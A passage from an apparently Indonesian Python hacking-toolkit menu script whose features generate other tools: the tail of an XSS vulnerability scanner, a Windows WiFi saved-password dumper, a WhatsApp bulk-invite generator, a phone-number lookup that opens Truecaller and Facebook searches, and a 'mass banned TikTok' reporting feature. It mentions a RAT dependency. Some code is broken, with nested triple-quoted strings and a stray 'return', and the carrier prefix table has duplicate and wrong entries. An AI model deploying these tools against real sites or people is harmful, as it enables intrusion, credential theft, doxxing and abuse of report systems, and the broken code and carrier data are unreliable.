                    context_end = min(len(content_lower), index + len(payload) + 100)
                    context = content_lower[context_start:context_end]
                    
                    if any(indicator.lower() in context for indicator in dom_indicators):
                        return {
                            'payload': payload,
                            'url': test_url,
                            'status': response.status_code,
                            'type': 'DOM-based',
                            'vulnerable': True
                        }
    
    except Exception as e:
        pass
    
    return None

def scan_for_parameters(url):
    """Find parameters in URL and forms"""
    parameters = set()
    
    # Get parameters from URL
    parsed = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed.query)
    parameters.update(query_params.keys())
    
    # Try to get forms from page
    try:
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Find form inputs
        forms = soup.find_all('form')
        for form in forms:
            inputs = form.find_all('input')
            for input_tag in inputs:
                if input_tag.get('name'):
                    parameters.add(input_tag.get('name'))
            
            # Also check textareas and selects
            textareas = form.find_all('textarea')
            for textarea in textareas:
                if textarea.get('name'):
                    parameters.add(textarea.get('name'))
            
            selects = form.find_all('select')
            for select in selects:
                if select.get('name'):
                    parameters.add(select.get('name'))
    
    except:
        pass
    
    return list(parameters)

def main():
    print("\\nXSS VULNERABILITY SCANNER")
    print("=" * 50)
    
    # Get target URL
    url = input("Target URL: ").strip()
    if not url:
        print("URL required!")
        return
    
    # Get parameters
    print("\\nScanning for parameters...")
    parameters = scan_for_parameters(url)
    
    if parameters:
        print(f"Found parameters: {', '.join(parameters)}")
        use_auto = input("Use these parameters? (y/n): ").lower()
        
        if use_auto != 'y':
            param_input = input("Parameters to test (comma separated): ").strip()
            if param_input:
                parameters = [p.strip() for p in param_input.split(',')]
    else:
        print("No parameters found automatically.")
        param_input = input("Parameters to test (comma separated): ").strip()
        if param_input:
            parameters = [p.strip() for p in param_input.split(',')]
    
    if not parameters:
        print("No parameters specified!")
        return
    
    # Get payloads
    print("\\nLoading XSS payloads...")
    payloads = get_xss_payloads()
    print(f"Loaded {len(payloads)} payloads")
    
    # Legal warning
    print("\\n[!] LEGAL WARNING:")
    print("    • Only test systems you own or have permission to test")
    print("    • XSS testing may execute JavaScript on the target")
    print("    • Unauthorized testing is illegal")
    print("    • Continue only if you have authorization")
    
    confirm = input("\\nDo you have permission to test this target? (y/n): ").lower()
    if confirm != 'y':
        print("Test cancelled.")
        return
    
    # Start testing
    print(f"\\nStarting XSS tests...")
    print(f"Target: {url}")
    print(f"Parameters: {', '.join(parameters)}")
    print(f"Payloads: {len(payloads)}")
    print()
    
    start_time = time.time()
    
    all_results = []
    
    for param in parameters:
        print(f"\\nTesting parameter: {param}")
        print("-" * 50)
        
        param_results = []
        
        for i, payload in enumerate(payloads):
            result = test_xss(url, param, payload)
            
            if result:
                param_results.append(result)
                print(f"[!] Potential XSS: {payload[:50]}...")
            
            # Progress indicator
            if (i + 1) % 10 == 0:
                print(f"  Progress: {i + 1}/{len(payloads)}")
        
        all_results.extend(param_results)
        
        if param_results:
            print(f"Found {len(param_results)} potential XSS for {param}")
        else:
            print(f"No XSS found for {param}")
    
    end_time = time.time()
    duration = end_time - start_time
    
    # Results summary
    print(f"\\n{'='*50}")
    print(f"XSS TEST RESULTS")
    print(f"{'='*50}")
    print(f"Target: {url}")
    print(f"Time: {time.ctime()}")
    print(f"Duration: {duration:.2f} seconds")
    print(f"Parameters tested: {len(parameters)}")
    print(f"Payloads tested: {len(payloads)}")
    print(f"Potential XSS found: {len(all_results)}")
    
    if all_results:
        print(f"\\nVULNERABILITIES FOUND:")
        
        # Group by parameter
        param_groups = {}
        for result in all_results:
            param = result['url'].split('=')[0].split('&')[-1]
            if param not in param_groups:
                param_groups[param] = []
            param_groups[param].append(result)
        
        for param, results in param_groups.items():
            print(f"\\n  Parameter: {param}")
            print(f"  Found: {len(results)} XSS payloads")
            
            for result in results[:5]:  # Show first 5
                print(f"    • {result['type']}: {result['payload'][:50]}...")
            
            if len(results) > 5:
                print(f"    ... and {len(results) - 5} more")
    
    # Save results
    if all_results:
        save = input("\\nSave results to file? (y/n): ").lower()
        if save == 'y':
            filename = f"xss_test_{urllib.parse.urlparse(url).netloc}_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(f"XSS Test Results\\n")
                f.write(f"{'='*50}\\n")
                f.write(f"Target: {url}\\n")
                f.write(f"Time: {time.ctime()}\\n")
                f.write(f"Duration: {duration:.2f} seconds\\n")
                f.write(f"Parameters tested: {len(parameters)}\\n")
                f.write(f"Payloads tested: {len(payloads)}\\n")
                f.write(f"XSS found: {len(all_results)}\\n\\n")
                
                f.write("VULNERABILITIES:\\n")
                for result in all_results:
                    f.write(f"\\nParameter: {result['url'].split('=')[0].split('&')[-1]}\\n")
                    f.write(f"Type: {result['type']}\\n")
                    f.write(f"Payload: {result['payload']}\\n")
                    f.write(f"URL: {result['url']}\\n")
                    f.write(f"{'-'*30}\\n")
            
            print(f"Results saved to {filename}")
    
    # Recommendations
    print(f"\\n{'='*50}")
    print(f"RECOMMENDATIONS")
    print(f"{'='*50}")
    print("If XSS vulnerabilities were found:")
    print("  1. Implement Content Security Policy (CSP)")
    print("  2. Use proper output encoding (HTML, JavaScript, URL)")
    print("  3. Validate and sanitize all user input")
    print("  4. Use HTTP-only cookies")
    print("  5. Implement XSS filters")
    print("  6. Use frameworks with built-in XSS protection")
    print("  7. Regular security testing and code review")
    print("  8. Educate developers about XSS risks")

if __name__ == "__main__":
    main()
'''
        
        filename = "xss_scanner.py"
        with open(filename, "w") as f:
            f.write(xss_scanner)
        
        print(colored(f"\n[XSS Scanner Generated]", 'green', attrs=['bold']))
        print(colored(f"   File: {filename}", 'cyan'))
        print(colored(f"   Tests for Cross-Site Scripting vulnerabilities", 'white'))
        print(colored(f"   Multiple payload types and detection methods", 'yellow'))
        print(colored(f"\n   Run: python3 {filename}", 'yellow'))
        print(colored("   WARNING: Only test authorized targets!", 'red'))
        print(colored("   May execute JavaScript on target", 'red'))
    
    elif choice == "5":
        print(colored("\n[WiFi Password Viewer - Windows Only]", 'yellow'))
        
        wifi_viewer = '''#!/usr/bin/env python3
import subprocess, re, json, os, sys

print("[WIFI PASSWORD VIEWER - WINDOWS]")

def get_wifi_profiles():
    """Get list of WiFi profiles"""
    try:
        # Run netsh command to get profiles
        result = subprocess.run(
            ['netsh', 'wlan', 'show', 'profiles'],
            capture_output=True,
            text=True,
            encoding='utf-8',
            errors='ignore'
        )
        
        if result.returncode != 0:
            print("Error: Could not get WiFi profiles")
            print(f"Command failed: {result.stderr}")
            return []
        
        # Extract profile names
        profiles = []
        lines = result.stdout.split('\\n')
        
        for line in lines:
            if 'All User Profile' in line or 'Profil semua pengguna' in line:
                # Extract profile name
                match = re.search(r':(.+)', line)
                if match:
                    profile_name = match.group(1).strip()
                    profiles.append(profile_name)
        
        return profiles
    
    except Exception as e:
        print(f"Error getting WiFi profiles: {e}")
        return []

def get_wifi_password(profile_name):
    """Get password for a specific WiFi profile"""
    try:
        # Run netsh command to get profile details
        result = subprocess.run(
            ['netsh', 'wlan', 'show', 'profile', f'name="{profile_name}"', 'key=clear'],
            capture_output=True,
            text=True,
            encoding='utf-8',
            errors='ignore'
        )
        
        if result.returncode != 0:
            return None, f"Error: Command failed for {profile_name}"
        
        # Extract password
        lines = result.stdout.split('\\n')
        password = None
        
        for line in lines:
            if 'Key Content' in line or 'Konten Kunci' in line:
                match = re.search(r':(.+)', line)
                if match:
                    password = match.group(1).strip()
                    break
        
        return password, None
    
    except Exception as e:
        return None, f"Error getting password for {profile_name}: {e}"

def export_to_file(wifi_data, filename):
    """Export WiFi data to file"""
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(wifi_data, f, indent=2, ensure_ascii=False)
        return True, None
    except Exception as e:
        return False, str(e)

def main():
    print("\\nWiFi Password Viewer for Windows")
    print("=" * 50)
    
    # Check if running on Windows
    if sys.platform != 'win32':
        print("Error: This tool only works on Windows!")
        print("Current platform:", sys.platform)
        return
    
    # Check if running as administrator
    print("Checking privileges...")
    try:
        # Try to create a file in system directory (requires admin)
        test_file = 'C:\\\\Windows\\\\Temp\\\\test_admin.tmp'
        with open(test_file, 'w') as f:
            f.write('test')
        os.remove(test_file)
        print("Running with administrator privileges")
    except:
        print("Warning: Not running as administrator")
        print("Some WiFi profiles may not be accessible")
        print("Run as Administrator for best results")
    
    # Get WiFi profiles
    print("\\nGetting WiFi profiles...")
    profiles = get_wifi_profiles()
    
    if not profiles:
        print("No WiFi profiles found!")
        return
    
    print(f"Found {len(profiles)} WiFi profile(s)")
    
    # Get passwords for each profile
    print("\\nRetrieving passwords...")
    print("-" * 50)
    
    wifi_data = []
    found_passwords = 0
    
    for profile in profiles:
        print(f"Processing: {profile}")
        
        password, error = get_wifi_password(profile)
        
        if error:
            print(f"  Error: {error}")
            wifi_data.append({
                'profile': profile,
                'password': None,
                'error': error
            })
        elif password:
            print(f"  Password: {password}")
            wifi_data.append({
                'profile': profile,
                'password': password,
                'error': None
            })
            found_passwords += 1
        else:
            print(f"  Password: Not found/stored")
            wifi_data.append({
                'profile': profile,
                'password': None,
                'error': 'Password not stored'
            })
    
    # Summary
    print(f"\\n{'='*50}")
    print("SUMMARY")
    print(f"{'='*50}")
    print(f"Total profiles: {len(profiles)}")
    print(f"Passwords retrieved: {found_passwords}")
    print(f"Profiles without stored passwords: {len(profiles) - found_passwords}")
    
    # Display results
    if found_passwords > 0:
        print(f"\\nWiFi NETWORKS WITH PASSWORDS:")
        print("-" * 50)
        
        for item in wifi_data:
            if item['password']:
                print(f"  SSID: {item['profile']}")
                print(f"  Password: {item['password']}")
                print()
    
    # Export option
    export = input("\\nExport results to file? (y/n): ").lower()
    if export == 'y':
        filename = input("Filename (default: wifi_passwords.json): ").strip()
        if not filename:
            filename = "wifi_passwords.json"
        
        success, error = export_to_file(wifi_data, filename)
        
        if success:
            print(f"\\n[✓] Results exported to {filename}")
            print(f"    File contains {len(wifi_data)} WiFi profiles")
        else:
            print(f"\\n[✗] Error exporting: {error}")
    
    # Security warning
    print(f"\\n{'='*50}")
    print("SECURITY WARNING")
    print(f"{'='*50}")
    print("• These passwords are stored on YOUR computer")
    print("• Do not share this information with others")
    print("• Only use on computers you own")
    print("• Delete the export file after use")
    
    input("\\nPress Enter to exit...")

if __name__ == "__main__":
    main()
'''
        
        filename = "wifi_password_viewer.py"
        with open(filename, "w") as f:
            f.write(wifi_viewer)
        
        print(colored(f"\n[WiFi Password Viewer Generated]", 'green', attrs=['bold']))
        print(colored(f"   File: {filename}", 'cyan'))
        print(colored(f"   Shows saved WiFi passwords on Windows", 'white'))
        print(colored(f"   Requires Administrator privileges", 'yellow'))
        print(colored(f"\n   Run: python3 {filename}", 'yellow'))
        print(colored("   Windows only! Requires admin rights.", 'red'))
    
    else:
        print(colored("[ERROR] Invalid choice!", 'red'))
        input("\nEnter...")
        return
    
    save_result("exploit.log", f"Generated {filename}")
    input("\nPress Enter to continue...")

# ================== FITUR 9: UNDANGAN WA LOCAL ==================
def fitur_9():  
    os.system('clear'); print(colored("\n[9] KIRIM UNDANGAN GRUP WA", 'cyan', attrs=['bold']))
    print(colored("   [LOCAL MODE - WhatsApp Group Invite]", 'yellow'))
    
    wa_script = '''#!/usr/bin/env python3
import webbrowser, pyperclip, time, os, sys

print("[WHATSAPP GROUP INVITE SENDER]")

def send_whatsapp_invite(phone_numbers, group_link, message=""):
    """Open WhatsApp Web with pre-filled message"""
    # Format phone numbers
    if isinstance(phone_numbers, str):
        phone_numbers = [phone_numbers]
    
    results = []
    
    for phone in phone_numbers:
        # Clean phone number
        phone_clean = ''.join(filter(str.isdigit, phone))
        
        if phone_clean.startswith('0'):
            phone_clean = '62' + phone_clean[1:]
        elif phone_clean.startswith('+62'):
            phone_clean = phone_clean[1:]
        elif phone_clean.startswith('62'):
            pass
        else:
            phone_clean = '62' + phone_clean
        
        # Create WhatsApp Web URL
        if message:
            encoded_message = f"Halo! Saya mengundang Anda untuk bergabung dengan grup WhatsApp ini:\\n{group_link}\\n\\n{message}"
        else:
            encoded_message = f"Halo! Saya mengundang Anda untuk bergabung dengan grup WhatsApp ini:\\n{group_link}"
        
        # URL encode the message
        import urllib.parse
        encoded_message = urllib.parse.quote(encoded_message)
        
        whatsapp_url = f"https://web.whatsapp.com/send?phone={phone_clean}&text={encoded_message}"
        
        results.append({
            'phone': phone,
            'phone_clean': phone_clean,
            'url': whatsapp_url,
            'status': 'Generated'
        })
    
    return results

def main():
    print("\\nWHATSAPP GROUP INVITE SENDER")
    print("=" * 50)
    
    print("\\nOptions:")
    print("  1. Send to single number")
    print("  2. Send to multiple numbers (from file)")
    print("  3. Generate links only")
    
    choice = input("\\nChoose option [1-3]: ").strip()
    
    # Get group link
    group_link = input("\\nWhatsApp group invite link: ").strip()
    if not group_link:
        print("Group link is required!")
        return
    
    # Validate group link
    if 'chat.whatsapp.com' not in group_link:
        print("Warning: Link doesn't appear to be a WhatsApp group invite")
        confirm = input("Continue anyway? (y/n): ").lower()
        if confirm != 'y':
            return
    
    # Custom message
    custom_message = input("\\nCustom invitation message (optional): ").strip()
    
    phone_numbers = []
    
    if choice == "1":
        # Single number
        phone = input("\\nPhone number (+62...): ").strip()
        if not phone:
            print("Phone number required!")
            return
        
        phone_numbers.append(phone)
    
    elif choice == "2":
        # Multiple numbers from file
        file_path = input("\\nFile with phone numbers (one per line): ").strip()
        if not os.path.exists(file_path):
            print("File not found!")
            return
        
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                for line in f:
                    phone = line.strip()
                    if phone:
                        phone_numbers.append(phone)
            
            if not phone_numbers:
                print("No phone numbers found in file!")
                return
            
            print(f"Loaded {len(phone_numbers)} phone number(s)")
        
        except Exception as e:
            print(f"Error reading file: {e}")
            return
    
    elif choice == "3":
        # Generate links only
        phone = input("\\nSample phone number (for link format): ").strip()
        if not phone:
            phone = "081234567890"
        
        phone_numbers.append(phone)
    
    else:
        print("Invalid choice!")
        return
    
    # Generate links
    print("\\nGenerating WhatsApp links...")
    results = send_whatsapp_invite(phone_numbers, group_link, custom_message)
    
    # Display results
    print(f"\\n{'='*50}")
    print("GENERATED LINKS")
    print(f"{'='*50}")
    
    for i, result in enumerate(results, 1):
        print(f"\\n[{i}] {result['phone']}")
        print(f"    Clean: {result['phone_clean']}")
        print(f"    URL: {result['url'][:80]}...")
    
    # Action based on choice
    if choice in ["1", "2"]:
        print(f"\\n{'='*50}")
        print("INSTRUCTIONS")
        print(f"{'='*50}")
        print("1. Open WhatsApp Web in your browser")
        print("2. Make sure you're logged in")
        print("3. Use the generated links to send invites")
        
        open_browser = input("\\nOpen first link in browser? (y/n): ").lower()
        if open_browser == 'y':
            webbrowser.open(results[0]['url'])
            print("Link opened in browser")
            
            if len(results) > 1:
                print(f"\\n{len(results) - 1} more link(s) available")
                copy_all = input("Copy all links to clipboard? (y/n): ").lower()
                if copy_all == 'y':
                    all_links = '\\n'.join([r['url'] for r in results])
                    try:
                        pyperclip.copy(all_links)
                        print("All links copied to clipboard")
                    except:
                        print("Could not copy to clipboard")
    
    elif choice == "3":
        print(f"\\n{'='*50}")
        print("LINK FORMAT")
        print(f"{'='*50}")
        print("Replace PHONE_NUMBER with actual phone number")
        print("Format: +62xxxxxxxxxxx (without +)")
        
        sample_url = results[0]['url']
        template_url = sample_url.replace(results[0]['phone_clean'], 'PHONE_NUMBER')
        
        print(f"\\nTemplate URL:")
        print(template_url)
        
        copy = input("\\nCopy template to clipboard? (y/n): ").lower()
        if copy == 'y':
            try:
                pyperclip.copy(template_url)
                print("Template copied to clipboard")
            except:
                print("Could not copy to clipboard")
    
    # Save results to file
    save = input("\\nSave results to file? (y/n): ").lower()
    if save == 'y':
        filename = f"whatsapp_invites_{int(time.time())}.txt"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"WhatsApp Group Invite Links\\n")
                f.write(f"{'='*50}\\n")
                f.write(f"Group Link: {group_link}\\n")
                f.write(f"Message: {custom_message or 'Default'}\\n")
                f.write(f"Generated: {time.ctime()}\\n")
                f.write(f"Count: {len(results)}\\n\\n")
                
                f.write("LINKS:\\n")
                for i, result in enumerate(results, 1):
                    f.write(f"\\n[{i}] Phone: {result['phone']}\\n")
                    f.write(f"    Clean: {result['phone_clean']}\\n")
                    f.write(f"    URL: {result['url']}\\n")
            
            print(f"\\n[✓] Results saved to {filename}")
        
        except Exception as e:
            print(f"\\n[✗] Error saving file: {e}")
    
    # Legal note
    print(f"\\n{'='*50}")
    print("IMPORTANT NOTES")
    print(f"{'='*50}")
    print("• Only send invites to people you know")
    print("• Respect others' privacy")
    print("• Do not spam")
    print("• WhatsApp may limit sending if abused")

if __name__ == "__main__":
    # Check dependencies
    try:
        import webbrowser
    except:
        print("Error: webbrowser module not available")
        sys.exit(1)
    
    try:
        import pyperclip
    except:
        print("Note: pyperclip not installed. Clipboard features disabled.")
        print("Install: pip install pyperclip")
        pyperclip = None
    
    main()
'''
    
    filename = "whatsapp_invite.py"
    with open(filename, "w") as f:
        f.write(wa_script)
    
    print(colored(f"\n[WhatsApp Invite Tool Generated]", 'green', attrs=['bold']))
    print(colored(f"   File: {filename}", 'cyan'))
    print(colored(f"   Generates WhatsApp group invite links", 'white'))
    print(colored(f"   Can send to multiple numbers", 'yellow'))
    print(colored(f"\n   Run: python3 {filename}", 'yellow'))
    print(colored("   Requires: pip install pyperclip (optional)", 'white'))
    
    save_result("undangan.log", f"Generated {filename}")
    input("\nPress Enter to continue...")

# ================== FITUR 10: DASHBOARD MONITORING ==================
def fitur_10():  
    os.system('clear'); print(colored("\n[10] DASHBOARD & SYSTEM INFO", 'cyan', attrs=['bold']))
    print(colored("   [LOCAL MODE - System Monitoring]", 'yellow'))
    
    print(colored("\nSystem Information:", 'cyan'))
    print(colored(f"   • Current User: {WHOAMI}", 'white'))
    print(colored(f"   • Time: {CURRENT_TIME}", 'white'))
    print(colored(f"   • Country: {COUNTRY}", 'white'))
    
    # Check dependencies
    print(colored("\nDependencies Status:", 'cyan'))
    deps = [
        ("Selenium", SELENIUM_AVAILABLE, "Web automation"),
        ("Cryptography", CRYPTO_AVAILABLE, "Encryption/RAT"),
        ("Pillow", PILLOW_AVAILABLE, "Image manipulation"),
    ]
    
    for name, available, desc in deps:
        status = colored("✓ Installed", 'green') if available else colored("✗ Missing", 'red')
        print(colored(f"   • {name}: {status} - {desc}", 'white'))
    
    # Results directory info
    if os.path.exists(RESULTS_DIR):
        files = os.listdir(RESULTS_DIR)
        print(colored(f"\nResults Directory: {RESULTS_DIR}", 'cyan'))
        print(colored(f"   • Files: {len(files)}", 'white'))
        if files:
            print(colored(f"   • Latest: {max(files, key=lambda f: os.path.getctime(os.path.join(RESULTS_DIR, f)))}", 'white'))
    
    # Token info
    tokens = load_tokens()
    print(colored(f"\nToken System:", 'cyan'))
    print(colored(f"   • Total tokens: {len(tokens)}", 'white'))
    
    active_tokens = sum(1 for t in tokens.values() if t.get('active', False))
    print(colored(f"   • Active tokens: {active_tokens}", 'green' if active_tokens > 0 else 'red'))
    
    # Developer mode info
    if IS_DEVELOPER:
        print(colored(f"\nDeveloper Mode:", 'magenta', attrs=['bold']))
        print(colored(f"   • Status: ACTIVE", 'green'))
        print(colored(f"   • Access: FULL PRIVILEGES", 'cyan'))
    
    # Update info
    print(colored(f"\nUpdate Information:", 'cyan'))
    print(colored(f"   • Script: {SCRIPT_NAME}", 'white'))
    print(colored(f"   • GitHub: {GITHUB_REPO}", 'white'))
    print(colored(f"   • Local Mode: ACTIVE (No VPS needed)", 'green'))
    
    # Quick actions
    print(colored(f"\nQuick Actions:", 'cyan'))
    print(colored("   1. Check for updates", 'white'))
    print(colored("   2. View results folder", 'white'))
    print(colored("   3. Install missing dependencies", 'white'))
    print(colored("   4. Back to menu", 'white'))
    
    action = input(colored("\nSelect action [1-4]: ", 'yellow')).strip()
    
    if action == "1":
        check_for_updates()
    elif action == "2":
        if os.path.exists(RESULTS_DIR):
            files = os.listdir(RESULTS_DIR)
            print(colored(f"\nFiles in {RESULTS_DIR}:", 'cyan'))
            for file in files[:20]:  # Show first 20 files
                size = os.path.getsize(os.path.join(RESULTS_DIR, file))
                print(colored(f"   • {file} ({size} bytes)", 'white'))
            if len(files) > 20:
                print(colored(f"   ... and {len(files) - 20} more", 'yellow'))
        else:
            print(colored("Results directory not found!", 'red'))
    elif action == "3":
        print(colored("\nInstalling missing dependencies...", 'cyan'))
        missing = []
        if not SELENIUM_AVAILABLE:
            missing.append("selenium")
        if not CRYPTO_AVAILABLE:
            missing.append("cryptography")
        if not PILLOW_AVAILABLE:
            missing.append("pillow")
        
        if missing:
            print(colored(f"   To install: pip install {' '.join(missing)}", 'yellow'))
            install = input(colored("   Run install command? (y/n): ", 'yellow')).lower()
            if install == 'y':
                for package in missing:
                    print(colored(f"   Installing {package}...", 'white'))
                    os.system(f"pip install {package}")
        else:
            print(colored("   All dependencies are installed!", 'green'))
    
    input("\nPress Enter to continue...")

# ================== FITUR 11: DEVTOOLS LOCAL ==================
def fitur_11():  
    os.system('clear'); print(colored("\n[11] DEVELOPER TOOLS", 'cyan', attrs=['bold']))
    
    if not IS_DEVELOPER:
        print(colored("   [ACCESS DENIED]", 'red', attrs=['bold']))
        print(colored("   This menu is for developers only!", 'yellow'))
        input("\nEnter...")
        return
    
    print(colored("   [DEVELOPER MENU - LOCAL MODE]", 'magenta', attrs=['bold']))
    
    print(colored("\nOptions:", 'cyan'))
    print(colored("   1. Create New Token", 'white'))
    print(colored("   2. View All Tokens", 'white'))
    print(colored("   3. Manual Update", 'white'))
    print(colored("   4. System Check", 'white'))
    print(colored("   5. Backup System", 'white'))
    print(colored("   6. Back to Menu", 'white'))
    
    choice = input(colored("\nSelect [1-6]: ", 'yellow')).strip()
    
    if choice == "1":
        create_token()
    elif choice == "2":
        view_tokens()
    elif choice == "3":
        manual_update()
    elif choice == "4":
        print(colored("\n[SYSTEM CHECK]", 'cyan'))
        print(colored(f"   • Python: {sys.version.split()[0]}", 'white'))
        print(colored(f"   • Platform: {sys.platform}", 'white'))
        print(colored(f"   • Current Dir: {os.getcwd()}", 'white'))
        print(colored(f"   • Script: {os.path.basename(__file__)}", 'white'))
        
        # Check important files
        important_files = [LICENSE_FILE, UA_FILE, "requirements.txt"]
        for file in important_files:
            exists = os.path.exists(file)
            status = colored("✓ Found", 'green') if exists else colored("✗ Missing", 'red')
            print(colored(f"   • {file}: {status}", 'white'))
        
        input("\nPress Enter...")
    elif choice == "5":
        print(colored("\n[BACKUP SYSTEM]", 'cyan'))
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_dir = f"backup_{timestamp}"
        
        os.makedirs(backup_dir, exist_ok=True)
        
        # Copy important files
        files_to_backup = [__file__, LICENSE_FILE]
        if os.path.exists(UA_FILE):
            files_to_backup.append(UA_FILE)
        if os.path.exists(RESULTS_DIR):
            files_to_backup.append(RESULTS_DIR)
        
        for file in files_to_backup:
            if os.path.exists(file):
                if os.path.isdir(file):
                    # Copy directory
                    import shutil
                    shutil.copytree(file, os.path.join(backup_dir, os.path.basename(file)))
                else:
                    # Copy file
                    import shutil
                    shutil.copy2(file, backup_dir)
        
        print(colored(f"   Backup created: {backup_dir}", 'green'))
        print(colored(f"   Files backed up: {len(files_to_backup)}", 'white'))
        input("\nPress Enter...")
    
    # Return to menu
    return

# ================== FITUR 14: PHONE NUMBER INFO LOCAL ==================
def fitur_14():  
    os.system('clear'); print(colored("\n[14] PHONE NUMBER INFORMATION", 'cyan', attrs=['bold']))
    print(colored("   [LOCAL MODE - Phone Number Lookup]", 'yellow'))
    
    phone = input(colored("Phone Number (+62...): ", 'yellow')).strip()
    
    if not phone:
        print(colored("[ERROR] Phone number required!", 'red'))
        input("\nEnter...")
        return
    
    print(colored(f"\n[ANALYZING] {phone}", 'green', attrs=['bold']))
    
    # Clean phone number
    clean_phone = ''.join(filter(str.isdigit, phone))
    
    if clean_phone.startswith('0'):
        clean_phone = '62' + clean_phone[1:]
    elif clean_phone.startswith('+62'):
        clean_phone = clean_phone[1:]
    elif clean_phone.startswith('62'):
        pass
    else:
        clean_phone = '62' + clean_phone
    
    print(colored(f"\n[FORMATTED] +{clean_phone}", 'cyan'))
    
    # Indonesian carrier prefixes
    carriers = {
        '0811': 'Telkomsel (Halo)',
        '0812': 'Telkomsel (Simpati)',
        '0813': 'Telkomsel (Simpati)',
        '0821': 'Telkomsel (Simpati)',
        '0822': 'Telkomsel (Simpati)',
        '0823': 'Telkomsel (Simpati)',
        '0852': 'Telkomsel (AS)',
        '0853': 'Telkomsel (AS)',
        '0851': 'Telkomsel (AS)',
        '0814': 'Telkomsel (IM3)',
        '0815': 'Telkomsel (IM3)',
        '0816': 'Telkomsel (IM3)',
        '0855': 'Telkomsel (IM3)',
        '0856': 'Telkomsel (IM3)',
        '0857': 'Telkomsel (IM3)',
        '0858': 'Telkomsel (IM3)',
        '0817': 'XL',
        '0818': 'XL',
        '0819': 'XL',
        '0859': 'XL',
        '0877': 'XL',
        '0878': 'XL',
        '0838': 'XL',
        '0831': 'AXIS',
        '0832': 'AXIS',
        '0833': 'AXIS',
        '0837': 'AXIS',
        '0895': 'AXIS',
        '0896': 'AXIS',
        '0897': 'AXIS',
        '0898': 'AXIS',
        '0899': 'AXIS',
        '0881': 'Smartfren',
        '0882': 'Smartfren',
        '0883': 'Smartfren',
        '0884': 'Smartfren',
        '0885': 'Smartfren',
        '0886': 'Smartfren',
        '0887': 'Smartfren',
        '0888': 'Smartfren',
        '0889': 'Smartfren',
        '0895': 'Three',
        '0896': 'Three',
        '0897': 'Three',
        '0898': 'Three',
        '0899': 'Three',
        '0895': 'Bolt',
        '0999': 'By.u',
    }
    
    # Identify carrier
    carrier = "Unknown"
    for prefix, name in carriers.items():
        if clean_phone.startswith(prefix[1:]):  # Remove leading '0' from prefix
            carrier = name
            break
    
    print(colored(f"\n[CARRIER] {carrier}", 'cyan'))
    
    # WhatsApp link
    print(colored(f"\n[WHATSAPP] https://wa.me/{clean_phone}", 'green'))
    
    # Truecaller search
    print(colored(f"\n[TRUECALLER] https://www.truecaller.com/search/id/{phone}", 'yellow'))
    
    # Social media search suggestion
    print(colored(f"\n[SOCIAL MEDIA SEARCH]", 'cyan'))
    print(colored("   • Facebook: Search by phone number", 'white'))
    print(colored("   • Instagram: May be linked", 'white'))
    print(colored("   • Telegram: Uses phone number", 'white'))
    
    # Save result
    save_result("phone_info.log", f"Phone: {phone} | Carrier: {carrier} | Clean: {clean_phone}")
    
    # Generate search script
    search_script = f'''#!/usr/bin/env python3
import webbrowser, time

phone = "{phone}"
clean_phone = "{clean_phone}"

print(f"Phone Number: {{phone}}")
print(f"Formatted: +{{clean_phone}}")
print(f"Carrier: {carrier}")

print("\\nOpening search links...")

# WhatsApp
whatsapp_url = f"https://wa.me/{{clean_phone}}"
print(f"   • WhatsApp: {{whatsapp_url}}")
webbrowser.open(whatsapp_url)
time.sleep(1)

# Truecaller
truecaller_url = f"https://www.truecaller.com/search/id/{{phone}}"
print(f"   • Truecaller: {{truecaller_url}}")
webbrowser.open(truecaller_url)
time.sleep(1)

# Facebook
facebook_url = f"https://www.facebook.com/search/top/?q=%2B{{clean_phone}}"
print(f"   • Facebook: {{facebook_url}}")
webbrowser.open(facebook_url)

print("\\nSearch links opened in browser!")
'''
    
    filename = f"phone_search_{clean_phone}.py"
    with open(filename, "w") as f:
        f.write(search_script)
    
    print(colored(f"\n[SEARCH SCRIPT] Generated: {filename}", 'green'))
    print(colored("   Run to automatically open search links", 'cyan'))
    
    input("\nPress Enter to continue...")

# ================== FITUR 15: MASS BANNED TIKTOK LOCAL ==================
def fitur_15():
    os.system('clear'); print(colored("\n[15] MASS BANNED TIKTOK", 'cyan', attrs=['bold']))
    if not SELENIUM_AVAILABLE:
        print(colored("   [INFO] Fitur ini membutuhkan: selenium", 'yellow'))
        print(colored("   Install: pip install selenium webdriver-manager", 'white'))
        input("\nEnter...")
        return
    
    print(colored("   [LOCAL MODE - TikTok Mass Report Generator]", 'yellow'))
    
    tiktok_script = '''#!/usr/bin/env python3
import time, random, sys, os

print("[TIKTOK MASS REPORT GENERATOR - EDUCATIONAL ONLY]")
print("\n[!] PERINGATAN:")
print("   • Penggunaan untuk tujuan jahat adalah ILEGAL")
print("   • Hanya untuk penelitian keamanan")
print("   • Gunakan hanya pada akun yang Anda miliki")
print("   • Bertanggung jawablah!")

print("\nFitur ini akan membuat script untuk:")
print("   1. Melaporkan video TikTok (automation)")
print("   2. Generator skrip report massal")
print("   3. Tools analisis TikTok")

choice = input("\nLanjutkan? (y/n): ").lower()
if choice != 'y':
    return

# Generate educational script
script_content = '''#!/usr/bin/env python3
"""
EDUCATIONAL TIKTOK ANALYSIS TOOL
Hanya untuk tujuan pembelajaran keamanan
"""

import time, random, json, os, sys

def educational_tiktok_analysis():
    """Analisis TikTok untuk penelitian keamanan"""
    print("[TIKTOK SECURITY RESEARCH TOOL]")
    
    print("\\nApa yang ingin Anda pelajari?")
    print("1. Cara kerja sistem report TikTok")
    print("2. Proteksi terhadap spam report")
    print("3. Best practices untuk keamanan akun")
    
    choice = input("Pilih [1-3]: ").strip()
    
    if choice == "1":
        print("\\n[TIKTOK REPORT SYSTEM - EDUCATIONAL]")
        print("TikTok menggunakan sistem yang canggih untuk mendeteksi:")
        print("   • Report spam")
        print("   • Report palsu")
        print("   • Koordinasi massal")
        print("   • Automated behavior")
        
        print("\\nSistem keamanan TikTok:")
        print("   1. Rate limiting: Membatasi report per akun")
        print("   2. Pattern detection: Mendeteksi pola mencurigakan")
        print("   3. User reputation: Skor kepercayaan pengguna")
        print("   4. AI moderation: Kecerdasan buatan untuk review")
        
    elif choice == "2":
        print("\\n[PROTECTIONS AGAINST SPAM REPORT]")
